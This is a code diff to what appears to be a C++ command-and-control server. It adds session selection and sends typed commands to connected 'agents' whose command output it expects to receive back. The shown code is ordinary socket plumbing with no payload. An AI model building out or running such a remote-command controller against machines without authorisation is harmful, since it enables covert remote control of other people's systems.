@@ -111,6 +111,21 @@ packet packet_wrapping(std::string command, int session_id){
 }
 
 
+int server::choose_session(std::unordered_map<uint32_t, int> session_registry){
+    uint32_t session_id;
+    while(true){
+        std::cout << "Choose session_id : ";
+        std::cin >> session_id;
+        if(session_registry.contains(session_id)){
+            return session_registry[session_id];
+        }    
+        else{
+            std::cout << "[*] invalid session input" << std::endl;
+        }
+    }
+}
+
+
 void server::send_commands(int soc_fd, int session_id){ // send message to client
     std::string command;
     packet p1;
@@ -118,6 +133,7 @@ void server::send_commands(int soc_fd, int session_id){ // send message to clien
     std::getline(std::cin >> std::ws, command);
     p1 = packet_wrapping(command, session_id);
     std::vector<uint8_t> byte_array = serialization(p1);
+    // instead of soc_fd we need to send session_registry[session_id] to send commands to that particular data only
     if(send(soc_fd, byte_array.data(), byte_array.size(), 0) < 0){
         common::code_exit();
     }
@@ -144,15 +160,6 @@ void server::handle_multiple_clients(int client_fd, int session_id){
     */
     std::cout << "[+] new agent connected" << std::endl;
     std::cout << "agent id : " << std::this_thread::get_id() << std::endl;
-    //send_commands(client_fd, session_id); // send msg to client
-    
-    /*
-    STORE THE SESSION ID AS AN INDEX FOR A ARRAY ORDERED OR UNORDERED MAP
-    THEN USE THAT SESSION ID TO STORE CLIENT FD
-    USE THAT CLIENT FD TO SENT DATA TO THAT PARTICULAR AGENT 
-    */
-
-    // receive stdout of the command executed in the agent.cpp side
 }
 
 
@@ -196,6 +203,9 @@ void server::listener(){
         // It identifies which member function the new thread should execute.
         // this keyword is used to tell the pointer which server object should it point to. In this case the current server object 
         client.detach();
+        int client_fd1 = choose_session(session_registry);
+        send_commands(client_fd1, session_id); // send msg to client
+        // receive stdout of the command executed in the agent.cpp side
     }
     std::cout << "[-]server exiting..." << std::endl;
     close(server_fd); // close server_socket created for listening
